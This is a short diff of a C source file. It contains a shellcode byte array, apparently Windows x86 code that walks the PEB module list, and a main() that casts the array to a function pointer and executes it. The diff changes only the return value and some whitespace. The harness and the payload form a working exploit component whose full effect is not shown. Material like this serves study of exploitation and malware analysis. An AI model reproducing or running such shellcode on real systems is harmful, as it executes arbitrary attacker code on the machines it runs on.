@@ -20,4 +20,6 @@ char shellcode[] = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42
            "\x49\x0b\x31\xc0\x51\x50\xff\xd7";
   
  
-int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();return 1;}
+
+int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();return 0;}
+
